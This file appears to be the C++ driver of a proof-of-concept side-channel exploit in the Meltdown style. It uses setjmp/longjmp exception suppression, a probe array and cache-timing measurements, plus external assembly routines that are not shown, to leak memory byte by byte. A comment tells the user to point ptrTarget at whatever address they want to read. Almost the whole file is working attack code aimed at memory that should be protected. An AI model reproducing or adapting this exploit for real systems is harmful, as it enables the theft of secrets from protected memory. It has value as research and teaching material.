#include "stdafx.h"
#include <setjmp.h>

#define TARGETS_N 5

extern "C" {
	LPVOID probeArray;
	LPVOID timings;
	QWORD  _leak(LPVOID ptr, DWORD dwSize, LPVOID lpDummy);
	QWORD _my_leak(LPVOID addr);
	void _read_time();
	QWORD raise_exp_f;
	LPVOID secret;
}

BYTE leak(LPVOID ptrAddr);
jmp_buf jump_buffer;

void raise_exp(QWORD n)
{
 	for (int i = 0;i < 10;i++)
 	;
	
	longjmp(jump_buffer, 1);

	return;
}


int main(int argc, char* argv[])
{
	LPVOID ptrTarget;
	CONST QWORD n = 4 * 0x0a;
	BYTE lpBuffer[n] = { 0 };
	
	probeArray = malloc(0x1000 * 0x100);
	
	secret = (LPVOID)malloc(0x1000 * 500);
	strcpy((char*)secret + 0x1000 * 250, "this is the secret");

	//change the ptrTarget to addr where you want to read.
	ptrTarget = (LPVOID)((char*)secret + 0x1000 * 250);


	timings = malloc(0x100 * sizeof(QWORD));
	raise_exp_f = (QWORD)raise_exp;

	std::cout << "leaking " << std::hex << ptrTarget << std::endl;
	for (DWORD i = 0; i < n; i++) {
		DWORD dwCounter = 0;
		do { 
			lpBuffer[i] = (BYTE)leak(((LPBYTE)ptrTarget) + i);
		} while ((DWORD)lpBuffer[i] == 0 && dwCounter++ < 0x1000);
		std::cout << std::hex << (DWORD)lpBuffer[i] << " "<< (char)lpBuffer[i] << std::endl;
	}

	free(secret);
	free(probeArray);
	free(timings);

	return 0;
}

BYTE leak(LPVOID ptrAddr) {
	QWORD leakedByte = 0;
	BYTE result = 0;

	BOOL match = FALSE;
	do {
		if (0 == setjmp(jump_buffer))
		{
			leakedByte = _my_leak(ptrAddr);
		}

		_read_time();
		for (DWORD i = 0; i < 0x100; i++) {
			if (((QWORD*)timings)[i] < 150) {
				match = TRUE;
				result = i;
				break;
			}
		}
	} while (!match);

	return (BYTE)result;
}

